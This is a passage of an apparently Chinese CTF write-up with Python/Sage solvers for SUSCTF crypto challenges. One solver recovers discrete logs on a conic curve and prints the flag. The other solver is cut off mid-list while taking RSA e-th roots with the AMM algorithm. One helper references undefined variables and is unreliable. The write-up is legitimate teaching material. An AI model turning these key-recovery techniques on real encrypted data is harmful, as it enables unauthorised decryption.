class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SpecialCurve</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,p,a,b</span>):</span><br>        self.p=p<br>        self.a=a<br>        self.b=b<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;SpecialCurve(<span class="hljs-subst">&#123;self.p&#125;</span>,<span class="hljs-subst">&#123;self.a&#125;</span>,<span class="hljs-subst">&#123;self.b&#125;</span>)&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">self,P1,P2</span>):</span><br>        x1,y1=P1<br>        x2,y2=P2<br>        <span class="hljs-keyword">if</span> x1==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> P2<br>        <span class="hljs-keyword">elif</span> x2==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> P1<br>        <span class="hljs-keyword">elif</span> x1==x2 <span class="hljs-keyword">and</span> (y1+y2)%self.p==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">if</span> P1==P2:<br>            t=(<span class="hljs-number">2</span>*self.a*x1-self.b)*inverse_mod(<span class="hljs-number">2</span>*y1,self.p)%self.p<br>        <span class="hljs-keyword">else</span>:<br>            t=(y2-y1)*inverse_mod(x2-x1,self.p)%self.p<br>        x3=self.b*inverse_mod(self.a-t**<span class="hljs-number">2</span>,self.p)%self.p<br>        y3=x3*t%self.p<br>        <span class="hljs-keyword">return</span> (x3,y3)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mul</span>(<span class="hljs-params">self,P,k</span>):</span><br>        <span class="hljs-keyword">assert</span> k&gt;=<span class="hljs-number">0</span><br>        Q=(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">while</span> k&gt;<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">if</span> k%<span class="hljs-number">2</span>:<br>                k-=<span class="hljs-number">1</span><br>                Q=self.add(P,Q)<br>            <span class="hljs-keyword">else</span>:<br>                k//=<span class="hljs-number">2</span><br>                P=self.add(P,P)<br>        <span class="hljs-keyword">return</span> Q<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Legendre</span>(<span class="hljs-params">a,p</span>):</span>       <span class="hljs-comment">#勒让德符号计算</span><br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">pow</span>((a%p+p)%p,(p-<span class="hljs-number">1</span>)//<span class="hljs-number">2</span>,p))%p<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_nonre</span>(<span class="hljs-params">p</span>):</span><br>    a=random.randint(<span class="hljs-number">1</span>,p)<br>    <span class="hljs-keyword">while</span> Legendre(a,p)==<span class="hljs-number">1</span>:<br>        a=random.randint(<span class="hljs-number">1</span>,p)<br>    <span class="hljs-keyword">return</span> a<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_ts</span>(<span class="hljs-params">p</span>):</span><br>    p=p-<span class="hljs-number">1</span><br>    count=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> p%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>        count+=<span class="hljs-number">1</span><br>        p=p//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> count,p<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">root_2</span>(<span class="hljs-params">a,p</span>):</span><br>    t,s=get_ts(p)<br>    ta=<span class="hljs-built_in">pow</span>(get_nonre(p),s,p)<br>    tb=<span class="hljs-built_in">pow</span>(a,s,p)<br>    h=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,t):<br>        d=<span class="hljs-built_in">pow</span>(tb,<span class="hljs-number">2</span>**t-<span class="hljs-number">1</span>-i,p)<br>        <span class="hljs-keyword">if</span> d==<span class="hljs-number">1</span>:<br>            k=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">else</span>:<br>            k=<span class="hljs-number">1</span><br>        tb=(tb*<span class="hljs-built_in">pow</span>(ta,<span class="hljs-number">2</span>*k,p))%p<br>        h=(h*<span class="hljs-built_in">pow</span>(ta,k,p))%p<br>        ta=<span class="hljs-built_in">pow</span>(ta,<span class="hljs-number">2</span>,p)<br>    <span class="hljs-built_in">print</span>(h*<span class="hljs-built_in">pow</span>(a,(s+<span class="hljs-number">1</span>)//<span class="hljs-number">2</span>,p)%p)<br>    <span class="hljs-keyword">return</span> h*<span class="hljs-built_in">pow</span>(a,(s+<span class="hljs-number">1</span>)//<span class="hljs-number">2</span>,p)%p<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">trans1</span>(<span class="hljs-params">a,p</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">lambda</span> t: (t+root_2(a,p))/(t-root_2(a,p))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">trans2</span>(<span class="hljs-params">a,p</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">lambda</span> t: <span class="hljs-number">1</span>/t<br><br><span class="hljs-comment">#a为系数列表,b为模数列表</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">myCRT</span>(<span class="hljs-params">a,b</span>):</span><br>    pro=<span class="hljs-number">1</span><br>    res=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>        pro*=i<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(b)):<br>        r=pro//b[i]<br>        res+=a[i]*r*inverse_mod(r,b[i])<br>    <span class="hljs-keyword">return</span> res%pro<br><br>curve1=SpecialCurve(<span class="hljs-number">233083587295210134948821000868826832947</span>,<span class="hljs-number">73126617271517175643081276880688551524</span>,<span class="hljs-number">88798574825442191055315385745016140538</span>)<br>G1=(<span class="hljs-number">183831340067417420551177442269962013567</span>, <span class="hljs-number">99817328357051895244693615825466756115</span>)<br>Q1=(<span class="hljs-number">166671516040968894138381957537903638362</span>, <span class="hljs-number">111895361471674668502480740000666908829</span>)<br>curve2=SpecialCurve(<span class="hljs-number">191068609532021291665270648892101370598912795286064024735411416824693692132923</span>,<span class="hljs-number">0</span>,<span class="hljs-number">58972296113624136043935650439499285317465012097982529049067402580914449774185</span>)<br>G2=(<span class="hljs-number">91006613905368145804676933482275735904909223655198185414549961004950981863863</span>, <span class="hljs-number">96989919722797171541882834089135074413922451043302800296198062675754293402989</span>)<br>Q2=(<span class="hljs-number">13504049588679281286169164714588439287464466303764421302084687307396426249546</span>, <span class="hljs-number">110661224324697604640962229701359894201176516005657224773855350780007949687952</span>)<br>curve3=SpecialCurve(<span class="hljs-number">52373730653143623993722188411805072409768054271090317191163373082830382186155222057388907031638565243831629283127812681929449631957644692314271061305360051</span>,<span class="hljs-number">28655236915186704327844312279364325861102737672471191366040478446302230316126579253163690638394777612892597409996413924040027276002261574013341150279408716</span>,<span class="hljs-number">42416029226399083779760024372262489355327595236815424404537477696856946194575702884812426801334149232783155054432357826688204061261064100317825443760789993</span>)<br>G3=(<span class="hljs-number">15928930551986151950313548861530582114536854007449249930339281771205424453985946290830967245733880747219865184207937142979512907006835750179101295088805979</span>, <span class="hljs-number">29726385672383966862722624018664799344530038744596171136235079529609085682764414035677068447708040589338778102975312549905710028842378574272316925268724240</span>)<br>Q3=(<span class="hljs-number">38121552296651560305666865284721153617113944344833289618523344614838728589487183141203437711082603199613749216407692351802119887009907921660398772094998382</span>, <span class="hljs-number">26933444836972639216676645467487306576059428042654421228626400416790420281717654664520663525738892984862698457685902674487454159311739553538883303065780163</span>)<br>P1,P2,P3=curve1.p,curve2.p,curve3.p<br>F1,F2,F3=GF(P1),GF(P2),GF(P3)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">t_G=F1(G1[1])/F1(G1[0])       #算t</span><br><span class="hljs-string">t_Q=F1(Q1[1])/F1(Q1[0])       #算t</span><br><span class="hljs-string">reflectionG=trans1(curve1.a,P1)(t_G)</span><br><span class="hljs-string">reflectionQ=trans1(curve1.a,P1)(t_Q)</span><br><span class="hljs-string">e1=reflectionQ.log(reflectionG)</span><br><span class="hljs-string">assert curve1.mul(G1,e1)==Q1</span><br><span class="hljs-string">print(e1)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>e1=<span class="hljs-number">184572164865068633286768057743716588370</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">t_G=F2(G2[1])/F2(G2[0])           #算t</span><br><span class="hljs-string">t_Q=F2(Q2[1])/F2(Q2[0])           #算t</span><br><span class="hljs-string">reflectionG=trans2(curve2.a,P2)(t_G)</span><br><span class="hljs-string">reflectionQ=trans2(curve2.a,P2)(t_Q)</span><br><span class="hljs-string">e2=ZZ(reflectionQ/reflectionG)</span><br><span class="hljs-string">assert curve2.mul(G2,e2)==Q2</span><br><span class="hljs-string">print(e2)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>e2=<span class="hljs-number">131789829046710687154053378348742202935151384644040019239219239301007568911745</span><br><br><span class="hljs-comment">#猜测群的阶，尝试分解p-1和p+1,以及p^2-1,p^2+1,p^3-1等，发现p+1光滑（实际上p^2-1和p^3-1都不需要，因为是因子,p^2+1和p^3-1搞不出来）,于是猜测群的阶为p+1</span><br>INF=(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)   <span class="hljs-comment">#无穷远点</span><br>Factor=[<span class="hljs-number">4</span>,<br> <span class="hljs-number">2663</span>,<br> <span class="hljs-number">5039</span>,<br> <span class="hljs-number">14759</span>,<br> <span class="hljs-number">18803</span>,<br> <span class="hljs-number">21803</span>,<br> <span class="hljs-number">22271</span>,<br> <span class="hljs-number">22307</span>,<br> <span class="hljs-number">23879</span>,<br> <span class="hljs-number">26699</span>,<br> <span class="hljs-number">35923</span>,<br> <span class="hljs-number">42727</span>,<br> <span class="hljs-number">48989</span>,<br> <span class="hljs-number">52697</span>,<br> <span class="hljs-number">57773</span>,<br> <span class="hljs-number">58129</span>,<br> <span class="hljs-number">60527</span>,<br> <span class="hljs-number">66877</span>,<br> <span class="hljs-number">69739</span>,<br> <span class="hljs-number">74363</span>,<br> <span class="hljs-number">75869</span>,<br> <span class="hljs-number">79579</span>,<br> <span class="hljs-number">80489</span>,<br> <span class="hljs-number">81043</span>,<br> <span class="hljs-number">81049</span>,<br> <span class="hljs-number">82531</span>,<br> <span class="hljs-number">84509</span>,<br> <span class="hljs-number">85009</span>,<br> <span class="hljs-number">91571</span>,<br> <span class="hljs-number">96739</span>,<br> <span class="hljs-number">98711</span>,<br> <span class="hljs-number">102481</span>,<br> <span class="hljs-number">103357</span>,<br> <span class="hljs-number">103981</span>]<br>dlogs=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Factor:<br>    Now=INF<br>    tmpG=curve3.mul(G3,ZZ((P3+<span class="hljs-number">1</span>))//ZZ(i))<br>    tmpQ=curve3.mul(Q3,ZZ((P3+<span class="hljs-number">1</span>))//ZZ(i))<br>    <span class="hljs-keyword">for</span> dlog <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i):<br>        Now=curve3.add(Now,tmpG)<br>        <span class="hljs-keyword">if</span> Now==tmpQ:<br>            dlogs.append(dlog)<br>            <span class="hljs-keyword">break</span><br><br>e3=myCRT(dlogs,Factor)+<span class="hljs-number">1</span> <span class="hljs-comment">#这里我们crt求出来的并非就是e3,还需要加上1</span><br><span class="hljs-built_in">print</span>(e3)<br>e3=<span class="hljs-number">23331486889781766099145299968747599730779731613118514070077298627895623872695507249173953050022392729611030101946661150932813447054695843306184318795467216</span><br><span class="hljs-keyword">assert</span>(curve3.mul(G3,e3)==Q3)<br>enc=<span class="hljs-number">4161358072766336252252471282975567407131586510079023869994510082082055094259455767245295677764252219353961906640516887754903722158044643700643524839069337</span><br>flag=enc^^bytes_to_long(hashlib.sha512(<span class="hljs-string">b&#x27;%d-%d-%d&#x27;</span>%(e1,e2,e3)).digest())<br><span class="hljs-built_in">print</span>(long_to_bytes(flag))<br><span class="hljs-comment">#b&#x27;SUSCTF&#123;Y0u_kNow_c0n1c_curv3_anD_discrete_l0g_vEry_we11~&#125;&#x27;</span><br><br></code></pre></td></tr></table></figure><h1 id="large-case"><a href="#large-case" class="headerlink" title="large case"></a>large case</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>给了p,q,r，n为三者的乘积，e就是phi的因子，并且是p-1,q-1,r-1中三个素因子的乘积，由于e，phi不互素，我们考虑使用AMM开根算法。尝试分解p-1,q-1,r-1，p-1能完全分解，q-1用yafu分解1300s也能搞出来，r-1搞了两个小时没出来（事实上证明没啥用）。由于AMM只能解决小指数的情形，若指数很大，这题就基本上没戏了（<del>不然可以发paper了</del>），所以我们猜想，e取的是p-1,q-1,r-1的小因子。但是r-1最小的因子都有上百万。因此我们利用条件将pad(m)的3096位归约到1024位到2048位之间，而p,q也是1024位，这时m就会在pq的域下了，所以我们丢掉r-1的因子，直接用p-1,q-1的小因子去搞（太小的如2，3，7还是不大可能），r-1也取个小因子（后面在跑的时候思考既然我们都已经不考虑r-1的因子了，那这个因子大不大其实跟我们没什么关系，当时想如果这个跑不出就换大因子搞，还好出了），开根之后得到flag。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#开r次方根</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Legendre</span>(<span class="hljs-params">a,p</span>):</span>       <span class="hljs-comment">#勒让德符号计算</span><br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">pow</span>((a%p+p)%p,(p-<span class="hljs-number">1</span>)//<span class="hljs-number">2</span>,p))%p<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ex_Legendre</span>(<span class="hljs-params">a,p,r</span>):</span>     <span class="hljs-comment">#判断是否为r次剩余</span><br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">pow</span>(a,(p-<span class="hljs-number">1</span>)//r,p)==<span class="hljs-number">1</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_nonre</span>(<span class="hljs-params">p</span>):</span><br>    a=random.randint(<span class="hljs-number">1</span>,p)<br>    <span class="hljs-keyword">while</span> Legendre(a,p)==<span class="hljs-number">1</span>:<br>        a=random.randint(<span class="hljs-number">1</span>,p)<br>    <span class="hljs-keyword">return</span> a<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_ex_nonre</span>(<span class="hljs-params">p,r</span>):</span><br>    a=random.randint(<span class="hljs-number">1</span>,p)<br>    <span class="hljs-keyword">while</span> ex_Legendre(a,p,r)==<span class="hljs-number">1</span>:<br>        a=random.randint(<span class="hljs-number">1</span>,p)<br>    <span class="hljs-keyword">return</span> a<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_ts</span>(<span class="hljs-params">p</span>):</span><br>    p=p-<span class="hljs-number">1</span><br>    count=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> p%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>        count+=<span class="hljs-number">1</span><br>        p=p//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> count,p<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_ex_ts</span>(<span class="hljs-params">p,r</span>):</span><br>    p=p-<span class="hljs-number">1</span><br>    count=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> p%r==<span class="hljs-number">0</span>:<br>        count+=<span class="hljs-number">1</span><br>        p=p//r<br>    <span class="hljs-keyword">return</span> count,p<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_alpha</span>(<span class="hljs-params">r,s</span>):</span><br>    k=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (s*k+<span class="hljs-number">1</span>)%r!=<span class="hljs-number">0</span>:<br>        k+=<span class="hljs-number">1</span><br>    alpha=(s*k+<span class="hljs-number">1</span>)//r<br>    <span class="hljs-keyword">return</span> alpha<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">amm2</span>(<span class="hljs-params">a,p</span>):</span><br>    t,s=get_ts(p)<br>    ta=<span class="hljs-built_in">pow</span>(get_nonre(p),s,p)<br>    tb=<span class="hljs-built_in">pow</span>(a,s,p)<br>    h=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,t):<br>        d=<span class="hljs-built_in">pow</span>(tb,<span class="hljs-number">2</span>**t-<span class="hljs-number">1</span>-i,p)<br>        <span class="hljs-keyword">if</span> d==<span class="hljs-number">1</span>:<br>            k=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">else</span>:<br>            k=<span class="hljs-number">1</span><br>        tb=(tb*<span class="hljs-built_in">pow</span>(ta,<span class="hljs-number">2</span>*k,p))%p<br>        h=(h*<span class="hljs-built_in">pow</span>(ta,k,p))%p<br>        ta=<span class="hljs-built_in">pow</span>(ta,<span class="hljs-number">2</span>,p)<br>    <span class="hljs-keyword">return</span> h*<span class="hljs-built_in">pow</span>(a,(s+<span class="hljs-number">1</span>)//<span class="hljs-number">2</span>,p)%p<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ammr</span>(<span class="hljs-params">a,p,r</span>):</span>           <span class="hljs-comment">#AMM获得一个根</span><br>    t,s=get_ex_ts(p,r)<br>    alpha=get_alpha(r,s)<br>    rho=get_ex_nonre(p,r)<br>    ta=<span class="hljs-built_in">pow</span>(rho,(s*r**(t-<span class="hljs-number">1</span>))%(p-<span class="hljs-number">1</span>),p)<br>    tb=<span class="hljs-built_in">pow</span>(a,r*alpha-<span class="hljs-number">1</span>,p)<br>    tc=<span class="hljs-built_in">pow</span>(rho,s,p)<br>    h=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> t==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(a,alpha*h,p),ta,p<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,t-<span class="hljs-number">1</span>):<br>        d=<span class="hljs-built_in">pow</span>(tb,r**(t-<span class="hljs-number">1</span>-i),p)<br>        <span class="hljs-keyword">if</span> d==<span class="hljs-number">1</span>:<br>            j=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;dddd&quot;</span>)<br>            j=-sympy.discrete_log(p,d,ta)<br>            <span class="hljs-comment">#j=-math.log(d,a)</span><br>            <span class="hljs-built_in">print</span>(j)<br>        b=b*<span class="hljs-built_in">pow</span>(<span class="hljs-built_in">pow</span>(tc,j,p),a)%p<br>        h=h*<span class="hljs-built_in">pow</span>(c,j,p)%p<br>        c=<span class="hljs-built_in">pow</span>(c,r,p)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(a,alpha*h,p),ta,p<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extend</span>(<span class="hljs-params">root,ta,p,r</span>):</span><br>    res=<span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r):<br>        tmp=root*<span class="hljs-built_in">pow</span>(ta,i,p)%p<br>        res.add(tmp)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(res)<br><br><span class="hljs-comment">#a为系数列表,b为模数列表</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">CRT</span>(<span class="hljs-params">a,b</span>):</span><br>    pro=<span class="hljs-number">1</span><br>    res=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>        pro*=i<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(b)):<br>        R=pro//b[i]<br>        res+=a[i]*R*invert(R,b[i])<br>    <span class="hljs-keyword">return</span> res%pro<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve_n</span>(<span class="hljs-params">a,p,q,r</span>):</span>        <span class="hljs-comment">#解当n=pq时的情形</span><br>    res=[]<br>    RES1=ammr(a%p,p,r)<br>    RES2=ammr(a%q,q,r)<br>    L1=extend(RES1[<span class="hljs-number">0</span>],RES1[<span class="hljs-number">1</span>],RES1[<span class="hljs-number">2</span>],r)<br>    L2=extend(RES2[<span class="hljs-number">0</span>],RES2[<span class="hljs-number">1</span>],RES2[<span class="hljs-number">2</span>],r)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> L1:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> L2:<br>            temp=CRT([i,j],[p,q])<br>            res.append(temp)<br>    <span class="hljs-keyword">return</span> res<br><br>p=<span class="hljs-number">127846753573603084140032502367311687577517286192893830888210505400863747960458410091624928485398237221748639465569360357083610343901195273740653100259873512668015324620239720302434418836556626441491996755736644886234427063508445212117628827393696641594389475794455769831224080974098671804484986257952189021223</span><br>q=<span class="hljs-number">145855456487495382044171198958191111759614682359121667762539436558951453420409098978730659224765186993202647878416602503196995715156477020462357271957894750950465766809623184979464111968346235929375202282811814079958258215558862385475337911665725569669510022344713444067774094112542265293776098223712339100693</span><br>r=<span class="hljs-number">165967627827619421909025667485886197280531070386062799707570138462960892786375448755168117226002965841166040777799690060003514218907279202146293715568618421507166624010447447835500614000601643150187327886055136468260391127675012777934049855029499330117864969171026445847229725440665179150874362143944727374907</span><br>a=<span class="hljs-number">2832775557487418816663494645849097066925967799754895979829784499040437385450603537732862576495758207240632734290947928291961063611897822688909447511260639429367768479378599532712621774918733304857247099714044615691877995534173849302353620399896455615474093581673774297730056975663792651743809514320379189748228186812362112753688073161375690508818356712739795492736743994105438575736577194329751372142329306630950863097761601196849158280502041616545429586870751042908365507050717385205371671658706357669408813112610215766159761927196639404951251535622349916877296956767883165696947955379829079278948514755758174884809479690995427980775293393456403529481055942899970158049070109142310832516606657100119207595631431023336544432679282722485978175459551109374822024850128128796213791820270973849303929674648894135672365776376696816104314090776423931007123128977218361110636927878232444348690591774581974226318856099862175526133892</span><br><br>PP=[ <span class="hljs-number">7</span>, <span class="hljs-number">757</span>, <span class="hljs-number">1709</span>, <span class="hljs-number">85015583</span>, <span class="hljs-number">339028665499</span>, <span class="hljs-number">149105250954771885483776047</span>, <span class="hljs-number">1642463892686572578602085475101104723805585678675707586553009837707279291648160744722745420570786735582631019452016654157586623543454908938807521637550223579103317696104438456966780396624343550451096013730928292041667133825444056448136643704677066463120079</span>]<br>QQ=[ <span class="hljs-number">3</span>, <span class="hljs-number">66553</span>, <span class="hljs-number">84405986771</span>, <span class="hljs-number">81768440203</span>, <span class="hljs-number">38037107558208320033</span>, <span 